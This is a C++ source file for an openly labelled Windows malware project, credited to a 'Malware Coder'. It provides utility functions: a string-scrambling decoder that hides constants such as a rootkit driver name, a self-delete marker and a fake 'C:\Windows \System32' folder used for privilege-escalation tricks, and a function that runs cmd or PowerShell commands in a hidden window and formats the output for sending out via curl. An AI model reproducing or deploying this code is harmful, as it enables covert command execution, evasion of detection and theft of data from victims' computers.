/*
##################################################
#                                                #
#         Malware Coder: Elliot Alderson         #
#                                                #
#   Github: https://github.com/ElliotAlderson51  #
#                                                #
##################################################
*/

#include "Tools.h"

#include <TlHelp32.h>
#include <string>
#include <sstream>

Tools::Tools() : HIDE_NAME(this->decode("ecsSowndWiskTatyriu")),
				 SELF_DELETE(this->decode("teledethpa_")),
				 MOCK_FOLDER(this->decode("s owndWi:\\2Cm3teys\\S")), 
				 ROOTKIT_SYS_FILE_NAME(this->decode("ricuSewsdoinrWverikDasyTt"))
{

	this->Computer_Username = this->GetMyName();
}

// Check if Directory is Exists
BOOL Tools::dirExists(const std::string& dirName_in)
{
	DWORD ftyp = GetFileAttributesA(dirName_in.c_str());
	if (ftyp == INVALID_FILE_ATTRIBUTES)
		return FALSE;  //something is wrong with your path!

	if (ftyp & FILE_ATTRIBUTE_DIRECTORY)
		return TRUE;   // this is a directory!

	return FALSE;    // this is not a directory!
}

// Check if File is Exists
BOOL Tools::FileExists(const std::string& path)
{
	DWORD dwAttribute = GetFileAttributesA(path.c_str());
	if (dwAttribute != INVALID_FILE_ATTRIBUTES && !(dwAttribute & FILE_ATTRIBUTE_DIRECTORY))
		return TRUE;
	return FALSE;
}

// Get Computer Username
std::string Tools::GetMyName()
{
	char username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;

	GetUserNameA(username, &username_len);
	return username;
}

// Get this program path
std::string Tools::GetThisProgramPath()
{
	char myPath[MAX_PATH];
	GetModuleFileNameA(NULL, myPath, MAX_PATH);
	return std::string(myPath);
}

BOOL Tools::WriteToFile(const std::string& path, const std::string& Text, HANDLE hFile)
{
	if(hFile == NULL)
		hFile = CreateFileA(path.c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile != INVALID_HANDLE_VALUE)
	{
		DWORD dwBytesToWrite = strlen(Text.c_str()) * sizeof(char);
		DWORD dwBytesWritten = 0;

		if (WriteFile(hFile, Text.c_str(), dwBytesToWrite, &dwBytesWritten, NULL))
		{
			CloseHandle(hFile);
			return TRUE;
		}

		CloseHandle(hFile);
	}

	return FALSE;
}

std::string Tools::ReadFromFile(const std::string& path)
{
	HANDLE hFile = CreateFileA(path.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile != INVALID_HANDLE_VALUE)
	{
		char buffer[256];

		// -1 for null terminator
		DWORD dwBytesToRead = 256 - 1;
		DWORD dwBytesRead = 0;

		if (ReadFile(hFile, buffer, dwBytesToRead, &dwBytesRead, NULL) == TRUE)
		{
			if (dwBytesRead > 0)
			{
				buffer[dwBytesRead] = '\0';
				CloseHandle(hFile);
				hFile = CreateFileA(path.c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
				if (hFile != INVALID_HANDLE_VALUE)
				{
					CloseHandle(hFile);
				}
				return std::string(buffer);
			}
		}
		CloseHandle(hFile);
	}

	return "";
}

BOOL Tools::isSystem32Bit()
{
	BOOL is64 = NULL;
	IsWow64Process(GetCurrentProcess(), &is64);

	if (!is64)
		return TRUE;
		
	return FALSE;
}

// Execute command in the CMD or Powershell and return the result
std::string Tools::CMD(std::string command, BOOL modify_for_curl_send, BOOL powershell, BOOL changeDirectory, BOOL fileExplorer)
{
	if (powershell)
		command = this->decode("llherswepondmaom-c ") + " \" & " + std::string(command) + "\""; // decode string -> powershell -command

	#ifndef LOG_OFF
		std::string command_debug = "Tools::CMD => Command: " + command + "\n";
		OutputDebugStringA(command_debug.c_str());
	#endif // !LOG_OFF

	std::string result;
	std::string sLog = "";

	// Use CreateProcess to hide the window
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	SECURITY_ATTRIBUTES sa;
	HANDLE hRead = NULL, hWrite = NULL;

	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));
	ZeroMemory(&sa, sizeof(sa));
	sa.nLength = sizeof(sa);
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;

	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;

	if (!CreatePipe(&hRead, &hWrite, &sa, 0))
	{
		if (hRead != NULL)
			CloseHandle(hRead);
		if (hWrite != NULL)
			CloseHandle(hWrite);

		#ifndef LOG_OFF
			OutputDebugStringA("Tools::CMD => CreatePipe failed\n");
		#endif // !LOG_OFF

		return "";
	}

	si.hStdOutput = hWrite;
	si.hStdError = hWrite;
	si.hStdInput = NULL;

	std::string cmdLine = "cmd.exe /c " + command;
	if (powershell)
		cmdLine = command; // already powershell -command

	BOOL success = CreateProcessA(
		NULL,
		(LPSTR)cmdLine.c_str(),
		NULL,
		NULL,
		TRUE,
		CREATE_NO_WINDOW,
		NULL,
		NULL,
		&si,
		&pi
	);

	CloseHandle(hWrite);

	if (!success)
	{
		CloseHandle(hRead);
		#ifndef LOG_OFF
			OutputDebugStringA("Tools::CMD => CreateProcessA failed\n");
		#endif // !LOG_OFF

		return "";
	}

	std::array<char, 128> buffer;
	DWORD bytesRead;
	while (ReadFile(hRead, buffer.data(), (DWORD)buffer.size(), &bytesRead, NULL) && bytesRead > 0)
		result.append(buffer.data(), bytesRead);

	CloseHandle(hRead);

	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	// Change Directory option
	if (changeDirectory)
		if (result == "")
			if (SetCurrentDirectoryA(command.c_str()))
				result = "success";

	#ifndef LOG_OFF
		sLog = "Tools::CMD => result (before fix): " + result + "\n";
		OutputDebugStringA(sLog.c_str());
	#endif // !LOG_OFF

	// Check if the string need to be fix
	if (result != "")
	{
		if (!fileExplorer)
		{
			// If fileExplorer is false, remove all newline characters ('\n') and carriage return characters ('\r') from the result string
			if (result.find('\n') != std::string::npos)
				result.erase(std::remove(result.begin(), result.end(), '\n'), result.end());

			if (result.find('\r') != std::string::npos)
				result.erase(std::remove(result.begin(), result.end(), '\r'), result.end());
		}
		else
		{
			// If fileExplorer is true, replace all newline characters ('\n') in the result string with asterisks ('*')
			if (result.find('\n') != std::string::npos)
				for (size_t i = 0; i < result.length(); i++)
					if (result[i] == '\n')
						result[i] = '*';
		}

		/*
		#ifndef LOG_OFF
			sLog = "Tools::CMD => result (after fix 1): " + result + "\n";
			OutputDebugStringA(sLog.c_str());
		#endif // !LOG_OFF
		*/

		// Replace all double spaces with single spaces
		std::string::size_type pos = result.find("  ");
		while (pos != std::string::npos)
		{
			result.replace(pos, 2, " ");
			pos = result.find("  ", pos);
		}

		/*
		#ifndef LOG_OFF
			sLog = "Tools::CMD => result (after fix 2): " + result + "\n";
			OutputDebugStringA(sLog.c_str());
		#endif // !LOG_OFF
		*/

		// Remove leading and trailing spaces
		if (result.find(' ') != std::string::npos)
		{
			int i = 0;
			while (result != "" && result[result.size() - 1] == ' ')
			{
				result.erase(result.size() - 1);

				/*
				#ifndef LOG_OFF
					std::stringstream ss;
					ss << i;
					sLog = "Tools::CMD => result (after fix 3): " + ss.str() + " " + result + "\n";
					OutputDebugStringA(sLog.c_str());
				#endif // !LOG_OFF
				i++;
				*/
			}

			while (result[0] == ' ')
			{
				result.erase(0, 1);
				/*
				#ifndef LOG_OFF
					std::stringstream ss;
					ss << i;
					sLog = "Tools::CMD => result (after fix 4): " + ss.str() + " " + result + "\n";
					OutputDebugStringA(sLog.c_str());
				#endif // !LOG_OFF
				i++;
				*/
			}
		}

		/*
		#ifndef LOG_OFF
			sLog = "Tools::CMD => result (after fix 5): " + result + "\n";
			OutputDebugStringA(sLog.c_str());
		#endif // !LOG_OFF
		*/

		// If modify_for_curl_send is true, replace all spaces with plus signs ('+')
		if (modify_for_curl_send)
		{
			if (result.find(' ') != std::string::npos)
				for (size_t i = 0; i < result.length(); i++)
					if (result[i] == ' ')
						result[i] = '+';
		}

		/*
		#ifndef LOG_OFF
			sLog = "Tools::CMD => result (after fix 6): " + result + "\n";
			OutputDebugStringA(sLog.c_str());
		#endif // !LOG_OFF
		*/
	}

	#ifndef LOG_OFF
		sLog = "Tools::CMD => result (after fix): " + result + "\n";
		OutputDebugStringA(sLog.c_str());
	#endif // !LOG_OFF

	return result;
}

// Custom string decoding - This is using to obfuscate strings from static analysis
std::string Tools::decode(std::string encoded_text)
{
	if (encoded_text.length() >= 4)
	{
		std::string reverse = "";
		std::string div = "";
		std::string order = "";

		// Reorder characters. "badc" will be "abcd" - Switch the current char with the next char
		for (size_t i = 0; i < encoded_text.length(); i += 2)
		{
			if (i != encoded_text.length() - 1)
			{
				order += encoded_text[i + 1];
				order += encoded_text[i];
			}
			else
			{
				order += encoded_text[i];
			}
		}

		// Divide the string by 2 and switch there location - "World Hello" will be "Hello World"
		int s = (encoded_text.length()) / 2;

		for (size_t i = s + 1; i < encoded_text.length(); i++) // Put the second half first in the new string
			div += order[i];

		for (int i = 0; i <= s; i++) // put the first half second in the new string
			div += order[i];

		// Reverse the string - "dcba" will be "abcd"
		for (int i = encoded_text.length() - 1; i >= 0; i--)
			reverse += div[i];

		return reverse;
	}

	return "";
}

BOOL Tools::isProcessRunning(const std::string& process_name)
{
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	std::wstring widestr = std::wstring(process_name.begin(), process_name.end());
	const wchar_t* processName = widestr.c_str();

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry) == TRUE)
		while (Process32Next(snapshot, &entry) == TRUE)
			if (_wcsicmp(entry.szExeFile, processName) == 0)
				return TRUE;

	CloseHandle(snapshot);
	return FALSE;
}

std::string Tools::URLEncode(const std::string& str)
{
	std::string encoded = "";
	for (size_t i = 0; i < str.length(); i++)
	{
		if (str[i] == ' ')
			encoded += "+";
		else
			encoded += str[i];
	}

	return encoded;
}